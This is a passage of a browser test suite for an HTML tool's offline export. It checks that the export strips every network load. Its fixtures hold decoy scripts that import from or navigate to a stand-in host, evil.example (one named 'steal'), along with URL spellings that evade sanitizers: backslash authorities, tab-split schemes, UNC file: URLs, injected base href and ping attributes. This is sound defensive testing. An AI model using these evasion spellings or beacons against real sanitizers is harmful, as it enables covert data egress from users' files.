    expect(exportedHtml, "the noticeless copy does not").not.toContain("cmh-noticeless-copy");
    expect((exportedHtml.match(/data-cmh-offline-lib="mermaid"/g) || []).length).toBe(1);
    expect((exportedHtml.match(/Third-party notice - mermaid/g) || []).length).toBe(1);
  } finally {
    fs.rmSync(staged.dir, { recursive: true, force: true });
  }
});

// A chart canvas the built-in renderer CAN draw, so the library travels only on script evidence.
const BORROWED_ID_CHART_CONTENT = `
<h1>Authored script that borrows the payload id</h1>
<p id="borrow-note">The chart below is drawn by an author script, not the built-in renderer.</p>
<figure class="chart">
  <div class="chart-wrap cm-skip" style="position: relative; height: 180px;">
    <canvas class="cmh-chart" id="borrowChart" width="360" height="180" role="img" aria-label="bar chart"
            data-cmh-chart-points='[{"label":"one","value":4},{"label":"two","value":9}]'></canvas>
  </div>
  <figcaption>Chart drawn by an author script.</figcaption>
</figure>
<script id="cmhVendoredRichLibs">
/* cmh-authored-chart */
(function () { if (typeof Chart === "undefined") return; new Chart(document.getElementById("borrowChart"), { type: "bar", data: { labels: [], datasets: [] } }); })();
</script>`;

test("CMH-OFFLINE-08: an authored script that borrows the payload id still counts as chart evidence", async ({ page }) => {
  test.setTimeout(90000);
  // The strip preserves a payload-id script inside the content root as authored content, so the
  // chart-evidence scan must stop exempting that id too: otherwise such a script survives into the
  // export while the library it calls is judged unnecessary, and the offline file breaks at load.
  // The canvas here IS drawable by the built-in renderer, so only the script's `Chart` reference can
  // provision the library.
  const staged = stageContent(BORROWED_ID_CHART_CONTENT, { key: "cmh-offline-borrowid", source: "offline-borrowid.html" });
  try {
    fs.writeFileSync(staged.html, withPayloadAfterContent(fs.readFileSync(staged.html, "utf8")));
    await page.route(/^https?:\/\//, (route) => route.abort());
    await installDownloadTextCapture(page);
    await page.goto(fileUrl(staged.html));
    await ready(page);
    await openToolbarMenu(page);
    await Promise.all([
      page.waitForEvent("download"),
      page.locator("#btnExportOfflineTop").click(),
    ]);
    const exportedHtml = await capturedDownloadText(page);

    expect(exportedHtml, "the authored chart script survives").toContain("cmh-authored-chart");
    expect(exportedHtml, "so the library it calls must travel with it").toContain('data-cmh-offline-lib="chartjs"');
    expect((exportedHtml.match(/Third-party notice - Chart\.js/g) || []).length).toBe(1);
  } finally {
    fs.rmSync(staged.dir, { recursive: true, force: true });
  }
});

// The layer's own id-bearing data blocks are DATA, and their text is reviewer-written, so the egress
// strips must not read a quoted example inside one as code. That exemption used to be claimed by ID
// ALONE and tested BEFORE the runnable-type test, so a decoy that merely BORROWED one of the ids ran
// in the exported file untouched by either strip - no aliasing and no obfuscation, which made it
// cheaper than every residual CMH-OFFLINE-05 lists.
const RESERVED_DATA_IDS = ["embeddedComments", "handledCommentIds", "commentableHtmlLayer", "reviewedSections"];
// The vendored payload id is deliberately NOT one of them: it is infrastructure resolved by POSITION
// (CMH-OFFLINE-07), so a script that merely borrows it is authored content and must clear the same
// egress scan as any other script. Pinned here beside the exemption so the boundary cannot drift.
const PAYLOAD_DECOY_ID = "cmhVendoredRichLibs";

function reservedIdDecoy(id) {
  return [
    '<script type="text/javascript" id="' + id + '">',
    "(function () {",
    "  window.__cmhReservedDecoysRan = window.__cmhReservedDecoysRan || [];",
    '  window.__cmhReservedDecoysRan.push("' + id + '");',
    '  import("https://evil.example/decoy-' + id + '.js").catch(function () {});',
    '  if (location.protocol === "file:") location.href = "https://evil.example/steal-' + id + '";',
    "})();",
    "</script>",
  ].join("\n");
}

const RESERVED_DECOY_CONTENT = [
  "<h1>Reserved-id decoys</h1>",
  '<p id="decoy-note">Borrowing a reserved layer id must not buy a script an exemption.</p>',
].concat(RESERVED_DATA_IDS.concat([PAYLOAD_DECOY_ID]).map(reservedIdDecoy)).concat([
  // A reserved-id block that also LOADS from the network. Neutralizing it does not save it - a
  // remote load is precisely what the strip exists to take away - so it must be removed, and the
  // kept-as-inert-data count must not claim it survived. That is what forces the count to be taken
  // AFTER the strips rather than at neutralization time.
  '<script type="text/javascript" id="reviewedSections" src="https://evil.example/decoy-src.js">',
  "/* cmh-decoy-with-src */",
  "</script>",
]).join("\n");

test("CMH-OFFLINE-04: a decoy runnable script cannot bypass the offline strips by borrowing a reserved layer id", async ({ page, browser }) => {
  test.setTimeout(90000);
  // Served over http so the beacons are armed only in the exported file (they test for `file:`),
  // exactly as the CMH-OFFLINE-05 navigation spec does.
  const staged = stageContent(RESERVED_DECOY_CONTENT, { key: "cmh-offline-reserved-decoys", source: "offline-reserved-decoys.html" });
  const server = await startStaticServer(staged.dir);
  const outDir = makeTmpDir();
  let ctx2;
  try {
    await page.route(/^https?:\/\//, async (route) => {
      const url = route.request().url();
      if (/^https?:\/\/(localhost|127\.0\.0\.1)(:|\/)/.test(url)) return route.fallback();
      return route.abort();
    });
    await installDownloadTextCapture(page);
    await page.goto(server.url + "/test-doc.html");
    await ready(page);
    await openToolbarMenu(page);
    await Promise.all([
      page.waitForEvent("download"),
      page.locator("#btnExportOfflineTop").click(),
    ]);
    const exportedHtml = await capturedDownloadText(page);

    // A reserved DATA block is never deleted: it may hold review state, so the export keeps the
    // bytes and takes away only the ability to run them...
    for (const id of RESERVED_DATA_IDS) {
      expect(exportedHtml, "decoy text for " + id + " is kept as data").toContain("decoy-" + id + ".js");
    }
    // ...while a script that borrows the PAYLOAD id is ordinary content and is stripped for its
    // egress like any other script, which is the boundary CMH-OFFLINE-07 draws.
    expect(exportedHtml, "the payload id earns no exemption").not.toContain("decoy-" + PAYLOAD_DECOY_ID + ".js");
    // ...and a reserved-id block that LOADS from the network is removed rather than repaired, so
    // the kept-as-inert count must not include it. Counting at neutralization time would.
    expect(exportedHtml, "a reserved-id script with a network src is removed").not.toContain("cmh-decoy-with-src");
    expect(exportedHtml).not.toContain("decoy-src.js");
    // Both outcomes are named to the author rather than left to be discovered.
    const toast = page.locator("#toast");
    await expect(toast).toContainText(/\b2 scripts that load, prefetch, or navigate to the network were removed\./);
    await expect(toast).toContainText("4 scripts carrying a reserved commentable-html data id were kept as inert data.");

    const exportedPath = path.join(outDir, "offline-reserved-decoys.html");
    fs.writeFileSync(exportedPath, exportedHtml);

    // Exporter and strict validator agree on the EGRESS exemption: neither sees a runnable
    // reserved-id script any more. They do not agree that this file is valid overall, and the
    // exporter never claimed that - a DUPLICATED reserved id is the source document's own
    // pre-existing invalidity, which the export preserves rather than papers over by deleting the
    // author's bytes. Pin exactly that split, so the weaker claim is not mistaken for the stronger.
    let strictOut = "";
    try {
      execFileSync(PYTHON, ["tools/validate/validate.py", "--strict", exportedPath], { cwd: SKILL, stdio: "pipe" });
      throw new Error("the strict validator accepted duplicate reserved ids");
    } catch (e) {
      strictOut = String(e.stdout || "") + String(e.stderr || "") + String(e.message || "");
    }
    expect(strictOut).toMatch(/appears 2 times \(must be unique\)/);
    expect(strictOut, "no egress complaint: the exemption agrees").not.toMatch(/imports a network module/);
    expect(strictOut, "no egress complaint: the exemption agrees").not.toMatch(/direct top-level/);

    ctx2 = await browser.newContext();
    const page2 = await ctx2.newPage();
    const external = [];
    await page2.route(/^https?:\/\//, async (route) => {
      external.push(route.request().url());
      await route.abort();
    });
    await page2.goto(fileUrl(exportedPath));
    await ready(page2);
    const state = await page2.evaluate((ids) => ({
      ran: window.__cmhReservedDecoysRan || [],
      // Read the TYPE off the live DOM rather than the HTML text: the exported file inlines the
      // layer runtime, whose own comments quote these ids as tag text, and a text scan would match
      // those quotes instead of a real element.
      types: Array.prototype.slice.call(document.querySelectorAll("script[id]"))
        .filter((s) => ids.includes(s.id))
        .map((s) => s.id + ":" + (s.getAttribute("type") || "")),
    }), RESERVED_DATA_IDS);
    expect(state.ran).toEqual([]);
    for (const entry of state.types) {
      expect(entry, "a reserved-id script must be inert data").toMatch(/:application\/json$/);
    }
    // The real blocks are still there, so the assertion above is not vacuously passing on an empty
    // set: the export cannot have deleted the layer's own state.
    expect(state.types.length).toBeGreaterThanOrEqual(RESERVED_DATA_IDS.length);
    expect(page2.url()).toBe(fileUrl(exportedPath));
    expect(external).toEqual([]);
  } finally {
    if (ctx2) await ctx2.close();
    await server.close();
    fs.rmSync(staged.dir, { recursive: true, force: true });
    fs.rmSync(outDir, { recursive: true, force: true });
  }
});

// An SVG <script> does not load through `src`: it uses `href` (SVG2) or the legacy `xlink:href`,
// and its body is EMPTY - so the loader strip's `script[src]` selector never saw it and the inline
// egress scan (which reads `textContent`) had nothing to read. Such a script survived into a file
// that promises zero network, with the CSP left as the only thing between it and the fetch (#881).
const SVG_SCRIPT_HREF_CONTENT = [
  "<h1>SVG script loaders</h1>",
  '<p id="svg-note">An SVG script loads through href, not src.</p>',
  '<svg width="10" height="10" aria-hidden="true">',
  // A decoy that also borrows a reserved layer id: neutralizing it into inert data does not save
  // it, because a remote LOAD is exactly what this strip exists to take away (the same rule the
  // `src` decoy pins).
  '  <script id="reviewedSections" href="https://evil.example/svg-href-decoy.js">/* cmh-svg-href-decoy */</script>',
  '  <script xlink:href="https://evil.example/svg-xlink-decoy.js">/* cmh-svg-xlink-decoy */</script>',
  '  <script href="//evil.example/svg-scheme-relative-decoy.js">/* cmh-svg-scheme-relative-decoy */</script>',
  // Two load attributes on ONE element: it must be removed, and counted, exactly once.
  '  <script href="https://evil.example/svg-both-a.js" xlink:href="https://evil.example/svg-both-b.js">/* cmh-svg-both-decoy */</script>',
  // ...and no further: a relative or data reference loads nothing over the network, so widening the
  // attribute set must not start deleting it.
  '  <script href="svg-local-keep.js">/* cmh-svg-relative-keep */</script>',
  '  <script xlink:href="data:text/javascript,void%200">/* cmh-svg-data-keep */</script>',
  // A browser removes leading C0 controls and spaces before it parses a URL, so a padded value is a
  // real load - and this exercises the runtime predicate end to end rather than through the constant
  // the parity test extracts.
  '  <script href=" \thttps://evil.example/svg-padded-decoy.js">/* cmh-svg-padded-decoy */</script>',
  // Character references are decoded by the parser, so the strip reads `//evil...` from the DOM -
  // this pins the getAttribute-to-predicate pipeline, not just the regex.
  '  <script xlink:href="&#x2f;&#x2f;evil.example/svg-entity-decoy.js">/* cmh-svg-entity-decoy */</script>',
  "</svg>",
  // A <template>'s children live in an inert content fragment that `querySelectorAll` cannot see,
  // while the validator's flat tokenizer reads the tags plainly - so this used to ride into the
  // export and then be REJECTED by the exporter's own --strict gate. Templates nest, so one decoy
  // sits a level deeper: a single-level walk would leave it behind.
  '<template><svg><script href="https://evil.example/template-decoy.js">/* cmh-template-decoy */</script></svg>'
  + '<template><svg><script xlink:href="https://evil.example/nested-template-decoy.js">/* cmh-nested-template-decoy */</script></svg></template></template>',
  // The same attributes are INERT on an HTML script - they fetch nothing, in HTML or in XHTML - so
  // deleting the element would destroy running author code over a dead attribute. The load is taken
  // away by removing the attribute alone, which also leaves the validator (whose flat tokenizer
  // reads all three attributes on every script) nothing to complain about.
  '<script href="https://evil.example/html-ns-decoy.js">/* cmh-html-href-keep */</script>',
].join("\n");

test("CMH-OFFLINE-04: an SVG script that loads through href or xlink:href is stripped like one with src", async ({ page, browser }) => {
  test.setTimeout(90000);
  const staged = stageContent(SVG_SCRIPT_HREF_CONTENT, { key: "cmh-offline-svg-script-href", source: "offline-svg-script-href.html" });
  const outDir = makeTmpDir();
  let ctx2;
  try {
    await page.route(/^https?:\/\//, (route) => route.abort());
    await installDownloadTextCapture(page);
    await page.goto(fileUrl(staged.html));
    await ready(page);
    await openToolbarMenu(page);
    await Promise.all([
      page.waitForEvent("download"),
      page.locator("#btnExportOfflineTop").click(),
    ]);
    const exportedHtml = await capturedDownloadText(page);

    for (const marker of ["cmh-svg-href-decoy", "cmh-svg-xlink-decoy", "cmh-svg-scheme-relative-decoy",
      "cmh-svg-both-decoy", "cmh-svg-padded-decoy", "cmh-svg-entity-decoy", "cmh-template-decoy",
      "cmh-nested-template-decoy"]) {
      expect(exportedHtml, `${marker} loads over the network and must be removed`).not.toContain(marker);
    }
    for (const target of ["evil.example/svg-href-decoy.js", "evil.example/svg-xlink-decoy.js",
      "evil.example/svg-scheme-relative-decoy.js", "evil.example/svg-both-a.js",
      "evil.example/svg-both-b.js", "evil.example/svg-padded-decoy.js",
      "evil.example/svg-entity-decoy.js", "evil.example/template-decoy.js",
      "evil.example/nested-template-decoy.js", "evil.example/html-ns-decoy.js"]) {
      expect(exportedHtml, `${target} must not survive`).not.toContain(target);
    }
    // An HTML script's `href` is inert, so the load is taken away without taking the author's code
    // with it: the element stays, the attribute does not.
    expect(exportedHtml, "an inert href must not cost the author their script").toContain("cmh-html-href-keep");
    // The controls must survive INTACT: keeping the element while silently dropping the reference
    // would be the same content loss in a quieter form.
    expect(exportedHtml, "a relative SVG script reference is not a network load").toContain("cmh-svg-relative-keep");
    expect(exportedHtml, "a data SVG script reference is not a network load").toContain("cmh-svg-data-keep");
    expect(exportedHtml).toContain('href="svg-local-keep.js"');
    expect(exportedHtml).toContain('xlink:href="data:text/javascript,void%200"');
    expect(networkLoadRefs(exportedHtml)).toEqual([]);
    // Removing a script is content loss, so it is named rather than silent - and the element
    // carrying TWO network attributes is counted once, not twice.
    await expect(page.locator("#toast")).toContainText("8 scripts that load, prefetch, or navigate to the network were removed.");

    const exportedPath = path.join(outDir, "offline-svg-script-href.html");
    fs.writeFileSync(exportedPath, exportedHtml);
    // The gate must agree with the strip: a file the exporter cleans is offline-clean to --strict
    // too. (The reserved id is DUPLICATED by the decoy in the source document, which is the source
    // document's own pre-existing invalidity - but the decoy carrying it is removed here, so the
    // exported file has one of each again and validates outright.)
    execFileSync(PYTHON, ["tools/validate/validate.py", "--strict", exportedPath], { cwd: SKILL, stdio: "pipe" });

    ctx2 = await browser.newContext();
    const page2 = await ctx2.newPage();
    const external = [];
    await page2.route(/^https?:\/\//, async (route) => {
      external.push(route.request().url());
      await route.abort();
    });
    await page2.goto(fileUrl(exportedPath));
    await ready(page2);
    expect(external).toEqual([]);
  } finally {
    if (ctx2) await ctx2.close();
    fs.rmSync(staged.dir, { recursive: true, force: true });
    fs.rmSync(outDir, { recursive: true, force: true });
  }
});

// A browser NORMALIZES a reference before it fetches: it removes ASCII tab/CR/LF from anywhere in
// the value, strips leading and trailing C0-or-space, and - for a special scheme - treats a
// backslash exactly like a slash. Both the strip and the validator used to test the raw literal, so
// `https:/\evil.example/x.js` (verified fetching https://evil.example/x.js in a real Chromium),
// `ht<tab>tps://...` and `file://host/...` (an SMB UNC fetch on Windows) rode into an offline file
// with only the CSP between them and the network (#923).
const NORMALIZED_URL_CONTENT = [
  "<h1>Browser-normalized references</h1>",
  '<p id="normalized-note">The URL parser cleans a value up before it fetches it.</p>',
  // Live-DOM decoys: every one of these resolves to https://evil.example, which the test's route
  // aborts, so nothing is actually fetched while the strip is exercised end to end.
  '<img id="cmh-img-backslash" src="https:/\\evil.example/img-backslash.png" alt="backslash authority">',
  '<img id="cmh-img-scheme-relative-backslash" src="\\\\evil.example/img-scheme-backslash.png" alt="backslash authority">',
  '<img id="cmh-img-tab" src="ht\ttps://evil.example/img-tab.png" alt="tab-split scheme">',
  // The srcset candidate boundary is HTML's, not the engine's: U+000B is engine whitespace but not
  // ASCII whitespace, so a candidate cut there hid the load from both implementations. Written as
  // character references so the spec file stays plain ASCII; the parser decodes them.
  '<img id="cmh-img-srcset" src="data:image/gif;base64,R0lGODlhAQABAAAAACw=" srcset="&#1;&#11;//evil.example/img-srcset.png 1x" alt="srcset">',
  '<iframe id="cmh-iframe-newline" src="https:\n//evil.example/frame-newline.html" title="newline-split"></iframe>',
  '<link rel="stylesheet" href="\\\\evil.example/style-backslash.css">',
  '<svg width="10" height="10" aria-hidden="true">',
  '  <script href="https:\\\\evil.example/svg-backslash.js">/* cmh-svg-backslash-decoy */</script>',
  "</svg>",
  // The `file:` decoys are template-parked on purpose: an authority-bearing `file:` URL is an SMB
  // fetch on Windows, and the point is what the strip and the gate DO with it, not to make the
  // source document attempt one. Template content is inert, and both implementations walk it.
  '<template><img id="cmh-img-unc" src="file://evil.example/img-unc.png" alt="unc">'
  + '<img id="cmh-img-unc4" src="file:////evil.example/img-unc4.png" alt="four-slash unc">'
  + '<svg><script href="file:\\\\evil.example/svg-unc.js">/* cmh-svg-unc-decoy */</script></svg></template>',
  // Controls: a backslash inside an ordinary relative path leaves it relative, and a `file:` URL
  // whose authority is empty or a Windows DRIVE LETTER stays on the machine, so none may be
  // touched. (The controls are SVG scripts rather than `<img>`s only because ANY local image path
  // draws the separate "inline_images" warning, which `--strict` treats as blocking.)
  '<svg width="10" height="10" aria-hidden="true">',
  '  <script href="sub\\svg-local-keep.js">/* cmh-svg-relative-keep */</script>',
  '  <script href="file:///local/svg-file-keep.js">/* cmh-svg-file-keep */</script>',
  '  <script href="file://C:/local/svg-drive-keep.js">/* cmh-svg-drive-keep */</script>',
  "</svg>",
].join("\n");

test("CMH-OFFLINE-04: the offline strip reads a reference the way the URL parser does", async ({ page, browser }) => {
  test.setTimeout(90000);
  const staged = stageContent(NORMALIZED_URL_CONTENT, { key: "cmh-offline-normalized-url", source: "offline-normalized-url.html" });
  const outDir = makeTmpDir();
  let ctx2;
  try {
    await page.route(/^https?:\/\//, (route) => route.abort());
    await installDownloadTextCapture(page);
    await page.goto(fileUrl(staged.html));
    await ready(page);
    await openToolbarMenu(page);
    await Promise.all([
      page.waitForEvent("download"),
      page.locator("#btnExportOfflineTop").click(),
    ]);
    const exportedHtml = await capturedDownloadText(page);

    for (const target of ["evil.example/img-backslash.png", "evil.example/img-scheme-backslash.png",
      "evil.example/img-tab.png", "evil.example/img-srcset.png", "evil.example/frame-newline.html",
      "evil.example/style-backslash.css", "evil.example/svg-backslash.js",
      "evil.example/img-unc.png", "evil.example/img-unc4.png", "evil.example/svg-unc.js"]) {
      expect(exportedHtml, `${target} is a network load a browser would make and must not survive`)
        .not.toContain(target);
    }
    // The controls must survive INTACT: over-detecting here would silently delete an author's
    // local reference, which is the same content loss in the other direction.
    expect(exportedHtml, "a backslash-separated relative path is not a network load").toContain('href="sub\\svg-local-keep.js"');
    expect(exportedHtml, "a backslash-separated relative script reference is not a network load").toContain("cmh-svg-relative-keep");
    expect(exportedHtml, "an empty-host file: URL stays on the machine").toContain('href="file:///local/svg-file-keep.js"');
    expect(exportedHtml, "a Windows drive letter in the host position is a local path").toContain('href="file://C:/local/svg-drive-keep.js"');
    // A deliberately COARSE raw-literal scan, not the production predicate: it recognizes only
    // `(?:https?:)?//`, so it cannot see the spellings this test is about. The explicit
    // not-toContain loop above is what covers those; this is the belt-and-braces sweep for the
    // ordinary ones.
    expect(networkLoadRefs(exportedHtml)).toEqual([]);

    const exportedPath = path.join(outDir, "offline-normalized-url.html");
    fs.writeFileSync(exportedPath, exportedHtml);
    // The gate must agree with the strip: a file the exporter cleans is offline-clean to --strict.
    execFileSync(PYTHON, ["tools/validate/validate.py", "--strict", exportedPath], { cwd: SKILL, stdio: "pipe" });

    ctx2 = await browser.newContext();
    const page2 = await ctx2.newPage();
    const external = [];
    await page2.route(/^https?:\/\//, async (route) => {
      external.push(route.request().url());
      await route.abort();
    });
    await page2.goto(fileUrl(exportedPath));
    await ready(page2);
    expect(external).toEqual([]);
  } finally {
    if (ctx2) await ctx2.close();
    fs.rmSync(staged.dir, { recursive: true, force: true });
    fs.rmSync(outDir, { recursive: true, force: true });
  }
});

const BASE_HREF_CONTENT = [
  "<h1>Injected base element</h1>",
  '<p id="base-note">A base element rebases every relative reference in this document.</p>',
  // The control case the strip and the gate both rest on: a RELATIVE reference loads nothing over
  // the network - unless a <base href> rebases it onto a remote host, which is what makes this
  // beacon fetch off-host while every check reads it as local. It is an iframe rather than an img
  // because the validator warns on a local-path img ("inline it as a data: URI"), and the exported
  // file is measured by `--strict`, which rejects a warning.
  '<iframe id="cmh-base-beacon" title="beacon" src="beacon.html"></iframe>',
  // A base is held to a STRICTER predicate than a per-resource load, because one attribute
  // re-points every safe reference in the document. A WHATWG URL parser resolves each of these to a
  // remote host (or, from file://, a UNC share) just as readily as `https://evil.example/`, so the
  // `//`-requiring network predicate the other passes use would have let the whole check be
  // side-stepped by dropping a slash.
  '<base id="cmh-base-schemeless-decoy" href="https:evil.example/schemeless/">',
  '<base id="cmh-base-oneslash-decoy" href="https:/evil.example/oneslash/">',
  '<base id="cmh-base-backslash-decoy" href="https:/\\evil.example/backslash/">',
  '<base id="cmh-base-scheme-relative-decoy" href="//evil.example/scheme-relative/">',
  '<base id="cmh-base-file-decoy" href="file://evil.example/share/">',
  '<base id="cmh-base-unc-decoy" href="\\\\evil.example\\share\\">',
  // A browser strips leading C0 controls and spaces before it parses a URL.
  '<base id="cmh-base-padded-decoy" href=" \thttps://evil.example/padded/">',
  // A template-parked base is inert until a script adopts the fragment and inserts it, at which
  // point it starts rebasing - the same reason the other offline passes walk into templates.
  '<template id="cmh-base-template"><base href="https://evil.example/parked/"></template>',
  // ...and no further: a relative base still resolves inside the file's own directory, and a
  // `target` is not egress at all, so both must survive INTACT.
  '<base id="cmh-base-keep" href="local-assets/" target="_blank">',
].join("\n");

function baseHrefValues(html) {
  return [...html.matchAll(/<base\b[^>]*>/gi)]
    .map((tag) => (tag[0].match(/\shref\s*=\s*["']([^"']*)["']/i) || [])[1])
    .filter((v) => v !== undefined);
}

test("CMH-OFFLINE-04: an injected base href cannot rebase the relative references the strip treats as safe", async ({ page, browser }) => {
  test.setTimeout(90000);
  const staged = stageContent(BASE_HREF_CONTENT, { key: "cmh-offline-base-href", source: "offline-base-href.html" });
  // The real shape: a base element belongs in the head, where it rebases the whole document.
  fs.writeFileSync(staged.html, fs.readFileSync(staged.html, "utf8").replace(
    "<head>", '<head>\n<base id="cmh-base-decoy" href="https://evil.example/rebased/">'));
  const outDir = makeTmpDir();
  let ctx2;
  let ctx3;
  try {
    await page.route(/^https?:\/\//, (route) => route.abort());
    await installDownloadTextCapture(page);
    await page.goto(fileUrl(staged.html));
    await ready(page);
    // The bug, pinned on the SOURCE document: the relative beacon really does resolve off-host.
    expect(await page.evaluate(() => document.getElementById("cmh-base-beacon").src))
      .toContain("evil.example");
    await openToolbarMenu(page);
    await Promise.all([
      page.waitForEvent("download"),
      page.locator("#btnExportOfflineTop").click(),
    ]);
    const exportedHtml = await capturedDownloadText(page);

    expect(exportedHtml, "a non-local base href must not survive, in any spelling").not.toContain("evil.example");
    // Neutralized, not deleted: taking the whole element would lose an author's `target` and any
    // other bookkeeping on it, and the reference the base was rebasing is content that stays.
    for (const id of ["cmh-base-decoy", "cmh-base-schemeless-decoy", "cmh-base-oneslash-decoy",
      "cmh-base-backslash-decoy", "cmh-base-scheme-relative-decoy", "cmh-base-file-decoy",
      "cmh-base-unc-decoy", "cmh-base-padded-decoy", "cmh-base-template", "cmh-base-keep"]) {
      expect(exportedHtml, `${id} must be kept as an element`).toContain(`id="${id}"`);
    }
    expect(exportedHtml).toContain('href="local-assets/"');
    expect(exportedHtml).toContain('target="_blank"');
    expect(exportedHtml).toContain('src="beacon.html"');
    // The direct evidence for the strip: the only base href left anywhere in the file is the
    // relative one. `networkLoadRefs` alone would not see a base at all before this spec added it.
    expect(baseHrefValues(exportedHtml)).toEqual(["local-assets/"]);
    expect(networkLoadRefs(exportedHtml)).toEqual([]);
    // Clearing a base re-points references that still WORK - author links included - so unlike
    // every other pass here it must not be silent.
    await expect(page.locator("#toast")).toContainText(
      "9 <base href> pointing away from this file were cleared, so relative references and links now resolve beside the file.");

    const exportedPath = path.join(outDir, "offline-base-href.html");
    fs.writeFileSync(exportedPath, exportedHtml);
    // The gate must agree with the strip: a file the exporter cleans is offline-clean to --strict.
    execFileSync(PYTHON, ["tools/validate/validate.py", "--strict", exportedPath], { cwd: SKILL, stdio: "pipe" });
    // ...and the other direction, which the clean file alone cannot prove: re-inject a base into
    // the EXPORTED file and the gate must reject it, so a hand-authored offline document cannot
    // keep what the strip takes away. The slash-less spelling is the one a `//` predicate misses.
    const reinjectedPath = path.join(outDir, "offline-base-href-reinjected.html");
    const reinjectedHtml = exportedHtml.replace(
      "<head>", '<head>\n<base id="cmh-base-reinjected" href="https:evil.example/rebased/">');
    expect(reinjectedHtml, "the base must actually have been re-injected").not.toEqual(exportedHtml);
    fs.writeFileSync(reinjectedPath, reinjectedHtml);
    // Pinned to the BASE rule, not merely to a non-zero exit: an exit-code-only assertion would be
    // satisfied by any future rule that happened to reject this file for an unrelated reason, which
    // is exactly how a fail-open regression in the check under test would go unnoticed.
    let reinjectedFailure = null;
    try {
      execFileSync(PYTHON, ["tools/validate/validate.py", "--strict", reinjectedPath], { cwd: SKILL, stdio: "pipe" });
    } catch (err) {
      reinjectedFailure = String(err.stdout || "") + String(err.stderr || "");
    }
    expect(reinjectedFailure, "--strict must reject a re-injected base").not.toBeNull();
    expect(reinjectedFailure).toMatch(/<base href="https:evil\.example/);
    expect(reinjectedFailure).toContain("cannot resolve on its own");

    ctx2 = await browser.newContext();
    const page2 = await ctx2.newPage();
    const external = [];
    await page2.route(/^https?:\/\//, async (route) => {
      external.push(route.request().url());
      await route.abort();
    });
    await page2.goto(fileUrl(exportedPath));
    await ready(page2);
    // Adopt every parked fragment, so a template-parked base would genuinely get its chance to
    // rebase the document before the beacon is re-read.
    await page2.evaluate(() => {
      document.querySelectorAll("template").forEach((t) => {
        document.body.appendChild(document.importNode(t.content, true));
      });
    });
    expect(await page2.evaluate(() => document.baseURI)).not.toContain("evil.example");
    expect(await page2.evaluate(() => document.getElementById("cmh-base-beacon").src))
      .toMatch(/^file:/);
    expect(await page2.evaluate(() => document.getElementById("cmh-base-decoy").hasAttribute("href")))
      .toBe(false);
    expect(external).toEqual([]);

    // The strip is the layer that must not DEPEND on the CSP, so prove it alone: the same export
    // with its zero-network policy removed must still resolve the beacon locally. Without this the
    // browser evidence above is satisfied by `base-uri 'none'` even if the strip did nothing.
    const noCspPath = path.join(outDir, "offline-base-href-no-csp.html");
    const cspMetaRe = /<meta\b[^>]*http-equiv=["']Content-Security-Policy["'][^>]*>/gi;
    expect((exportedHtml.match(cspMetaRe) || []).length, "the export must carry a CSP meta").toBeGreaterThan(0);
    // Global on purpose: a future second policy meta must not be left behind to satisfy the
    // "without the CSP" evidence below on the strip's behalf.
    const noCspHtml = exportedHtml.replace(cspMetaRe, "");
    expect(noCspHtml.match(cspMetaRe), "every CSP meta must actually have been removed").toBeNull();
    fs.writeFileSync(noCspPath, noCspHtml);
    ctx3 = await browser.newContext();
    const page3 = await ctx3.newPage();
    const externalNoCsp = [];
    await page3.route(/^https?:\/\//, async (route) => {
      externalNoCsp.push(route.request().url());
      await route.abort();
    });
    await page3.goto(fileUrl(noCspPath));
    await ready(page3);
    await page3.evaluate(() => {
      document.querySelectorAll("template").forEach((t) => {
        document.body.appendChild(document.importNode(t.content, true));
      });
    });
    expect(await page3.evaluate(() => document.baseURI)).not.toContain("evil.example");
    expect(await page3.evaluate(() => document.getElementById("cmh-base-beacon").src)).toMatch(/^file:/);
    expect(externalNoCsp).toEqual([]);
  } finally {
    if (ctx2) await ctx2.close();
    if (ctx3) await ctx3.close();
    fs.rmSync(staged.dir, { recursive: true, force: true });
    fs.rmSync(outDir, { recursive: true, force: true });
  }
});

// Two more egress shapes that were in neither the offline strip nor the strict validator (#992):
// hyperlink auditing (`<a ping>` / `<area ping>`, which POSTs to every URL it names on every
// click) and the SVG filter primitive `feImage`, which fetches exactly like the `<image>` and
// `<use>` the media list already covered. The controls sit beside them: a RELATIVE and a `data:`
// feImage reference must survive untouched, and every element must keep its identity - only the
// egress goes.
const PING_FEIMAGE_CONTENT = [
  "<h1>Hyperlink auditing and filter primitives</h1>",
  '<p id="ping-note">A ping attribute POSTs to every URL it names on every click.</p>',
  '<a id="cmh-ping-link" href="#ping-note" ping="https://evil.example/audit https://evil.example/audit-2">audited link</a>',
  // A RELATIVE ping is removed too: it still POSTs, it shows the reader nothing, and the gate
  // rejects one for exactly that reason, so keeping it would be the drift this closes.
  '<a id="cmh-ping-relative" href="#ping-note" ping="audit.php">locally audited link</a>',
  // A value made only of ASCII whitespace names no URL, so a browser sends nothing and BOTH sides
  // must leave the bytes exactly as the author wrote them - the control for the tokenization rule.
  '<a id="cmh-ping-blank" href="#ping-note" ping=" ">unaudited link</a>',
  '<map name="cmh-map"><area id="cmh-ping-area" shape="rect" coords="0,0,1,1" href="#ping-note" ping="https://evil.example/area-audit" alt="audited area"></map>',
  // A template-parked one starts auditing the moment a script adopts the fragment, which is why
  // every load pass walks into templates.
  '<template id="cmh-ping-template"><a id="cmh-ping-parked" href="#ping-note" ping="https://evil.example/parked-audit">parked</a></template>',
  '<svg id="cmh-fe-svg" width="8" height="8">',
  // SVG 2 gives its own anchor a `ping` too, and the tag-name selector matches it in either
  // namespace - as does the validator's flat tokenizer, which only ever sees the name `a`.
  '<a id="cmh-ping-svg" href="#ping-note" ping="https://evil.example/svg-audit"><rect width="2" height="2"></rect></a>',
  '<filter id="cmh-fe-net"><feImage id="cmh-fe-href" href="https://evil.example/fe.png"></feImage></filter>',
  '<filter id="cmh-fe-net-legacy"><feImage id="cmh-fe-xlink" xlink:href="https://evil.example/fe-legacy.png"></feImage></filter>',
  '<filter id="cmh-fe-keep"><feImage id="cmh-fe-relative" href="local-tile.png"></feImage></filter>',
  '<filter id="cmh-fe-keep-data"><feImage id="cmh-fe-data" xlink:href="data:image/gif;base64,R0lGODlhAQABAAAAACw="></feImage></filter>',
  '<rect width="8" height="8" filter="url(#cmh-fe-net)"></rect>',
  "</svg>",
  '<template id="cmh-fe-template"><svg><filter id="cmh-fe-parked-filter"><feImage id="cmh-fe-parked" href="https://evil.example/parked-fe.png"></feImage></filter></svg></template>',
  // Authored OUTSIDE any <svg>, so the HTML parser leaves it in the HTML namespace. It fetches
  // nothing there, but the validator's tokenizer cannot tell the two apart, so the strip must clear
  // it too or the gate would reject a file the exporter had just produced. This is what makes the
